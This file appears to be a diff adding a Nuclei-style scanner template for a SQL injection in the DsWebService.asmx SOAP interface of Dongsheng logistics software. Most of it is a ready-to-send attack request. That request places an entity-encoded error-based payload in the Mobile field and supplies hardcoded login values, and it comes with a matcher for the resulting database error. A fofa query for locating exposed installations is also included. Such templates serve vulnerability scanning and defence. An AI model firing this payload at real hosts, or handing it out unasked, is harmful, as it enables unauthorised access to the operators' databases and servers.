@@ -1,0 +1,41 @@
+http:
+    - matchers:
+        - dsl:
+            - status_code==500 && contains_all(body,"nvarchar","数据类型","int")
+          name: SQL注入
+          type: dsl
+      raw:
+        - |
+          POST /Webservice/DsWebService.asmx HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaiBsDataList"
+
+          <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
+             <soap:Header/>
+             <soap:Body>
+                <dsw:GetSeaiBsDataList>
+                   <!--Optional:-->
+                   <dsw:LoginName>qdtaize</dsw:LoginName>
+                   <!--Optional:-->
+                   <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
+                   <!--Optional:-->
+                   <dsw:Mobile>&#x31;&#x27;&#x29;&#x20;&#x6f;&#x72;&#x20;&#x31;&#x3d;&#x40;&#x40;&#x56;&#x45;&#x52;&#x53;&#x49;&#x4f;&#x4e;&#x2d;&#x2d;</dsw:Mobile>
+                   <!--Optional:-->
+                   <dsw:Mblno>1</dsw:Mblno>
+                   <dsw:start>1</dsw:start>
+                   <dsw:limit>1</dsw:limit>
+                </dsw:GetSeaiBsDataList>
+             </soap:Body>
+          </soap:Envelope>
+id: DongShengWuLiu-DsWebService-SQL
+info:
+    author: HuanXiong
+    description: |-
+        fofa: app="东胜物流软件-物流软件"
+        东胜物流软件 DsWebService.asmx 接口处存在SQL注入漏洞，未经授权攻击者可通过该漏洞获取数据库敏感信息，进一步利用可获取服务器权限，导致网站处于极度不安全状态。
+    name: 东胜物流软件 DsWebService.asmx SQL注入
+    reference:
+        - null
+    severity: high
+    tags:
+        - 东胜物流软件
